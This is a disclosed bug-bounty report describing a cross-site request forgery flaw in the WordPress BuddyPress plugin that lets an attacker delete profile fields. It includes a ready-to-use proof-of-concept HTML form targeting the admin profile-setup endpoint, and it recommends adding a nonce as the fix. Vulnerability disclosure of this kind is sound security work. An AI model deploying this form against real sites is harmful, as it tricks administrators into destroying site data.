# CSRF in Profile Fields allows deleting any field in BuddyPress

## Report Details
- **Report ID**: 836187
- **URL**: https://hackerone.com/reports/836187
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-04-01T13:28:23.968Z
- **Disclosed**: 2020-05-22T00:32:45.432Z

## Reporter
- **Username**: hoangkien1020
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: wordpress

## Vulnerability Information
## Description:

CSRF in Profile Fields allows deleting any field in BuddyPress
Version: Latest

## Steps To Reproduce:
Step1: Using a form like so to create the CSRF:
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="[domain]/wp-admin/users.php">
      <input type="hidden" name="page" value="bp&#45;profile&#45;setup" />
      <input type="hidden" name="mode" value="delete&#95;field" />
      <input type="hidden" name="field&#95;id" value="[id_field]" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
Change your [domain] and [id_field]
Step 2: When admin click with step 1 was hidden in images,.... Step1 will allow deleting with [id_field]


## Recommendations
Adding _wpnonce for this function

## Impact

Attacker will this vulnerable to delete profile fileds, break availability and integrity.

## Attachments
No attachments
